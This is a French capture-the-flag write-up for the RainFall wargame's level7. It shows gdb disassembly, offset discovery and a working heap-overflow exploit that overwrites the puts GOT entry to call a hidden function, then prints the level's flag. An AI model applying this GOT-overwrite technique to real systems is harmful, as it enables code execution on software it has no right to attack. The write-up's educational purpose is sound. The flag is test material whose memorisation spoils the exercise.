# Level7

```
level7@RainFall:~$ ./level7
^CSegmentation fault (core dumped)
level7@RainFall:~$ ./level7 coucou
^CSegmentation fault (core dumped)
level7@RainFall:~$ ./level7 coucou coucou
~~
```
Ce nouveau programme prend en parametre deux arguments donnés au programme.


Une fonction "m" n'est pas appelée par le programme main. Le main alloue 8 char pour chaque argument passés, sur le tas avec la fonction strcpy. Nous allons exploiter un overflow.
Commençons par vérifier a quel endroit de la mémoire nous pouvons écraser l'adresse de retour.

```
level7@RainFall:~$ /home/user/level7/level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY
ZZZZ aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
level7@RainFall:~$ dmesg | grep "segfault"
[28297.550418] level7[9471]: segfault at 46464646 ip b7eb02b9 sp bffff614 error 6 in libc-2.15.so[b7e2c000+1a3000]
```
l'offset est 20 (46464646 = FFFF)

Puis nous inspectons la fonction puts utilisée après:
```
0x080485f7 <+214>:	call   0x8048400 <puts@plt>

(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:	jmp    *0x8049928
(gdb) x/x 0x8049928
   0x8049928 <puts@got.plt>:     0x08048406
```
Nous allons utiliser le puts final : nous savons que le programme stocke l'appel de chaque fonction dans la GOT (Global Offset Table) ce qui permet au prochains appels de cette fonction, de ne pas aller chercher a chaque fois dans la bibliotèque standard C.

Nous allons ecraser la valeur du puts (qui pointe vers le puts de la GOT) pour sauter vers la fonction m.


```
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   %ebp
   0x08048522 <+1>:     mov    %esp,%ebp
   0x08048524 <+3>:     and    $0xfffffff0,%esp
   0x08048527 <+6>:     sub    $0x20,%esp
   0x0804852a <+9>:     movl   $0x8,(%esp)
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
   0x0804853a <+25>:    mov    0x1c(%esp),%eax
   0x0804853e <+29>:    movl   $0x1,(%eax)
   0x08048544 <+35>:    movl   $0x8,(%esp)
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    %eax,%edx  <=== break ici
   0x08048552 <+49>:    mov    0x1c(%esp),%eax
   0x08048556 <+53>:    mov    %edx,0x4(%eax)
   0x08048559 <+56>:    movl   $0x8,(%esp)
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    %eax,0x18(%esp)
   0x08048569 <+72>:    mov    0x18(%esp),%eax
   0x0804856d <+76>:    movl   $0x2,(%eax)
   0x08048573 <+82>:    movl   $0x8,(%esp)
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    %eax,%edx <=== break ici

End of assembler dump.
(gdb) b*0x08048550
Breakpoint 1 at 0x8048550
(gdb) b *0x0804857f
Breakpoint 2 at 0x804857f

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level7/level7

Breakpoint 1, 0x08048550 in main ()
(gdb) i r
eax            0x804a018   <=== adresse du malloc de strcpy1     134520856

(gdb) c
Continuing.

Breakpoint 2, 0x0804857f in main ()
(gdb) i r
eax            0x804a038     <=== adresse du malloc de strcpy2    134520888

```

Les deux buffer des array1[1] et array2[1] sont proche en memoire, en ecrivant a (buffer strcpy1) + 20, l'adresse de puts, on ecrase le buffer de copy du 2e strcpy par l'adresse du puts, et on y ecris l'adresse de la fonction m.

Lors de l'appel de puts, c'est maintenant la fonction m qui sera appelee.

```
level7@RainFall:~$ /home/user/level7/level7 $(python -c 'print ("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print ("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

